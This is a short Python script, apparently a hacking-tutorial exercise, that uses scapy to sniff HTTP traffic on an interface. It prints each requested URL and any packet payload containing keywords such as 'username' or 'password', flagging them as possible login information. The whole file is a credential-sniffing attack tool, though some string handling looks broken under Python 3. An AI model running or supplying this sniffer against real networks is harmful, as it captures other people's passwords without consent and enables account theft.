from scapy.all import *
from scapy.layers import http


def my_sniff(interface):
    sniff(iface = interface, store = False,prn = process_sniffed_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load
        keywords = ["username", "user", "login", "password", "pass"]

        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        login_info = get_login_info(packet)

        print("URL requested: " + str(url))

        if login_info:
            print("Posible login information: " + login_info)

my_sniff("eth0") # Your interface